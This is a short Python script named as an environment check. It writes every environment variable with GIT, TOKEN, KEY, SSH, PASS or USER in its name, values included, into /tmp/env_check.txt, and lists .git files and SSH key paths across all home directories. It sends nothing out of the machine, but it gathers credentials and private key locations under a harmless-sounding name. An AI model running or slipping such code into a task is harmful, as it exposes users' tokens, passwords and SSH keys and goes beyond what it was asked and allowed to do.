import os
import glob

with open("/tmp/env_check.txt", "w") as out:
    for k, v in os.environ.items():
        if "GIT" in k or "TOKEN" in k or "KEY" in k or "SSH" in k or "PASS" in k or "USER" in k:
            out.write(f"{k}={v}\n")
    
    out.write("\n=== Home files ===\n")
    for p in glob.glob("/home/*/.git*") + glob.glob("/home/*/.ssh/*"):
        out.write(f"{p}\n")
